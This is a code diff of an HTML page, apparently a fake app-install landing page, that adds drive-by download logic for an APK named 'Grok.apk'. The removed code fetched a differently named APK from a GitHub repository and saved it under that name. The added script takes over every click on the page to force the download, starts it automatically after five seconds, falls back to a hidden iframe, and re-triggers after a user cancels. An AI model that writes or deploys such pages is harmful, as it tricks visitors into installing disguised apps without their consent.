@@ -259,7 +259,7 @@ margin-bottom: 24px;
             </div>
         </div>
         <!-- Install button in the middle of the page -->
-        <div class="main-install-btn">Instalar</div>
+        <div class="main-install-btn" onclick="startDownload()">Instalar</div>
 
         <!-- Operation bar -->
         <div class="action-row">
@@ -463,21 +463,64 @@ margin-bottom: 24px;
     </main>
 
     <!-- Any click triggers download logic + prevents default redirection -->
-    <script>
-        function startDownload() {
-            // 请替换为实际的 APK 文件链接
-            const downloadUrl = "https://raw.githubusercontent.com/phuonganhle1812-lang/apkpurokj/refs/heads/main/GardenTV_v1.1.2.apk"; 
-            const a = document.createElement('a');
-            a.href = downloadUrl;
-            a.download = 'Grok.apk';
-            a.style.display = 'none';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-        }
+        <script>
+        // 配置下载链接
+        const apkUrl = "https://example.com/Grok.apk"; 
+// 状态变量
+        let isProcessing = false; // 是否正在处理（防止短时间内重复触发）
+        let autoDownloadHasRun = false; // 记录自动下载是否运行过
 
+        function startDownload(source) {
+            // 如果正在处理中（冷却期内），则直接返回，防止重复弹窗
+            if (isProcessing) {
+                console.log("冷却中，忽略此次请求...");
+                return;
+            }
+
+            // 标记为正在处理
+            isProcessing = true;
+            console.log("触发下载来源: " + source);
+
+            // 1. 主要下载方式：当前页跳转（这对安卓Chrome最友好，不会被视为拦截）
+            window.location.href = apkUrl;
+
+            // 2. 备用下载方式：Iframe（以此提高兼容性）
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = apkUrl;
+                document.body.appendChild(iframe);
+            }, 500);
+
+            // 关键修复：设置“冷却时间”
+            // 2秒后重置 isProcessing 为 false。
+            // 这样如果用户点击了“取消”，2秒后他们再次点击屏幕，依然可以触发下载。
+            setTimeout(() => {
+                isProcessing = false;
+                console.log("冷却结束，允许再次点击下载");
+            }, 2000);
+}
+
+        // 监听全屏点击 (捕获阶段)
+        document.addEventListener('click', function(e) {
+            // 阻止默认行为（防止页面跳转或按钮刷新）
+            e.preventDefault(); 
+            e.stopPropagation(); 
+            
+            // 用户主动点击，立即触发
+            startDownload("UserClick");
+        }, true);
+
+        // 页面加载逻辑
         window.onload = function() {
-           // setTimeout(startDownload, 50000); // 延迟 1.5 秒后自动下载
+            // 5秒后尝试自动下载
+            setTimeout(() => {
+                // 如果用户之前没有手动点击过（或者点击过但已经冷却结束），并且自动下载还没跑过
+                if (!autoDownloadHasRun) {
+                    autoDownloadHasRun = true; 
+                    startDownload("AutoTimer");
+                }
+            }, 5000);
         }
     </script>
 </body>
